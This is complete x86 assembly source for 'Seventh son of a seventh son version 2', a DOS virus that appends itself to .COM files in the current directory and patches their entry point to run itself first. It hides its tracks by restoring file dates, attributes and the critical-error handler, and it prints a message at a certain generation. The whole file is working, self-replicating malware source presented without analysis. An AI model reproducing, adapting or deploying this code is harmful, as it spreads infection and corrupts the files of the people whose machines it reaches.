;****************************************************************************
;*              Seventh son of a seventh son    version 2
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

FILELEN         equ     end - start
MINTARGET       equ     1000
MAXTARGET       equ     -(FILELEN+40h)

                org     100h

                .RADIX  16


;****************************************************************************
;*              Dummy program (infected)
;****************************************************************************

begin:          db      4Dh
                jmp     start


;****************************************************************************
;*              Begin of the virus
;****************************************************************************

start:          call    start2
start2:         pop     bp
                sub     bp,0103h

                lea     si,[bp+offset begbuf-4] ;restore begin of file
                mov     di,0100h
                movsw
                movsw

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                xor     dl,dl                   ;clear the flag
                mov     ax,3301h
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                mov     dx,offset ni24 - 4      ;set new int24 vector
                add     dx,bp
                mov     ax,2524h
                int     21

                lea     dx,[bp+offset end]      ;set new DTA adres
                mov     ah,1Ah
                int     21
                add     dx,1Eh
                mov     word ptr [bp+offset nameptr-4],dx

                lea     si,[bp+offset grandfather-4]  ;check generation
                cmp     [si],0606h
                jne     verder

                lea     dx,[bp+offset sontxt-4]     ;7th son of a 7th son!
                mov     ah,09h
                int     21

verder:         mov     ax,[si]                 ;update generations
                xchg    ah,al
                xor     al,al
                mov     [si],ax

                lea     dx,[bp+offset filename-4]  ;find first COM-file
                xor     cx,cx
                mov     ah,4Eh
                int     21

infloop:        mov     dx,word ptr [bp+offset nameptr-4]
                call    infect

                mov     ah,4Fh                  ;find next file
                int     21
                jnc     infloop

                pop     ds                      ;restore int24 vector
                pop     dx
                mov     ax,2524h
                int     21

                pop     dx                      ;restore ctrl-break flag
                mov     ax,3301h
                int     21

                push    cs
                push    cs
                pop     ds
                pop     es
                mov     ax,0100h                ;put old start-adres on stack
                push    ax

                ret


;****************************************************************************
;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

                mov     ax,4300h                ;ask attributes
                int     21
                push    cx

                xor     cx,cx                   ;clear flags
                call    setattr
                jc      return1

                mov     ax,3D02h                ;open the file
                int     21
                jc      return1
                xchg    bx,ax

                mov     ax,5700h                ;get file date & time
                int     21
                push    cx
                push    dx

                mov     cx,4                    ;read begin of file
                lea     dx,[bp+offset begbuf-4]
                mov     ah,3fh
                int     21

                mov     al,byte ptr [bp+begbuf-4]  ;already infected?
                cmp     al,4Dh
                je      return2
                cmp     al,5Ah                  ;or a weird EXE?
                je      return2

                call    endptr                  ;get file-length

                cmp     ax,MAXTARGET            ;check length of file
                jnb     return2
                cmp     ax,MINTARGET
                jbe     return2

                push    ax
                mov     cx,FILELEN              ;write program to end of file
                lea     dx,[bp+offset start-4]
                mov     ah,40h
                int     21
                cmp     ax,cx                   ;are all bytes written?
                pop     ax
                jnz     return2

                sub     ax,4                    ;calculate new start-adres
                mov     word ptr [bp+newbeg-2],ax

                call    beginptr                ;write new begin of file
                mov     cx,4
                lea     dx,[bp+offset newbeg-4]
                mov     ah,40h
                int     21

                inc     byte ptr [si]           ;number of next son

return2:        pop     dx                      ;restore file date & time
                pop     cx
                mov     ax,5701h
                int     21

                mov     ah,3Eh                  ;close the file
                int     21

return1:        pop     cx                      ;restore file-attribute
;                call    setattr

;                ret


;****************************************************************************
;*              Changes file-attributes
;****************************************************************************

setattr:        mov     dx,word ptr [bp+offset nameptr-4]
                mov     ax,4301h
                int     21
                ret


;****************************************************************************
;*              Subroutines for file-pointer
;****************************************************************************

beginptr:       mov     ax,4200h                ;go to begin of file
                jmp     short ptrvrdr

endptr:         mov     ax,4202h                ;go to end of file
ptrvrdr:        xor     cx,cx
                xor     dx,dx
                int     21
                ret


;****************************************************************************
;*              Interupt handler 24
;****************************************************************************

ni24:           mov     al,03
                iret


;****************************************************************************
;*              Data
;****************************************************************************

begbuf          db      0CDh,  20h, 0, 0
newbeg          db       4Dh, 0E9h, 0, 0
nameptr         dw      ?
sontxt          db      'Seventh son of a seventh son',0Dh, 0Ah, '$'
grandfather     db      0
father          db      0
filename        db      '*.COM',0
                db      '�����'

end:

cseg            ends
                end     begin

